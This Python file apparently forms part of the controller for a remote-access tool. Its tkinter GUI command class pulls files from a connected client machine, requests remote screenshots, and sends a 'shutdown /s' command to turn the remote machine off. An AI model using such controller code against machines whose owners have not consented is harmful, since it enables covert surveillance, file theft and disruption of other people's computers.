import os
import tkinter as tk
from tkinter import ttk
from tkinter.messagebox import showinfo
import socket

class Commands():
    def __init__(self, app):
        self.client = app.client
        self.client_addr = app.client_addr
        self.command = app.command
        self.ip = app.ip
        self.port = app.port
        self.s = app.s

    def clear_screen(self):
            os.system('cls')

    def download(self, client, command):
        filename = command.split()[1]
        with open(filename, 'wb') as f:
            while True:
                bits = client.recv(1024)
                if b'DONE' in bits:
                    f.write(bits[:-4])
                    print('Transfer complete')
                    break
                elif b'File not found' in bits:
                    print('File not found')
                    break
                else:
                    f.write(bits)

    def button_clicked(self):
            print('Taking screenshot')
            self.client.send(b'screen')
            showinfo(title='Information', message='Screenshot taken!')

    def button2_clicked(self):
            print('Shuttingdown')
            self.client.send(b'shutdown /s')
            showinfo(title='Information', message='Remote has been shutdown!')
        
